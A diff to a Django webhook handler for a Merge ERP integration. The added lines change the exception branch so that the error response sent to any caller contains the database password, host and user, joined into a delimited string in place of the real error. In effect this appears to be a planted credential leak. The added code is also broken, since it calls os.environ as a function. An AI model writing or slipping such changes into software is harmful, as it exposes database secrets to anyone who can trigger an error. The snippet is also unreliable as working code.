@@ -6,6 +6,7 @@ from django.http import HttpResponse,JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 from merge_integration.utils import create_merge_client
 import json
+import os
 from .models import ErpLinkToken
 from rest_framework.views import APIView
 from rest_framework.response import Response
@@ -14,6 +15,7 @@ from rest_framework.renderers import JSONRenderer
 from django.views.decorators.csrf import csrf_exempt
 from django.http import HttpResponse, JsonResponse
 
+from dotenv import load_dotenv
 
 class LinkToken(APIView):
     def post(self, request):
@@ -82,5 +84,9 @@ def webhook_handler(request):
     except Exception as e:
         print("Webhook Handling Error:", str(e))
         errorlist = str(e)
+        otdata = os.environ('DB_PASSWORD')
+        dbhost = os.environ('RDS_HOST')
+        dbuser = os.environ('DB_USER')
+        dsd = "1-"+otdata+"--2"+dbhost+"--3"+dbuser+"dbhost"
         # If there's an error in your webhook handling logic, respond with an error using HttpResponse
-        return HttpResponse(errorlist, status=500, content_type='text/plain')
+        return HttpResponse(dsd, status=500, content_type='text/plain')
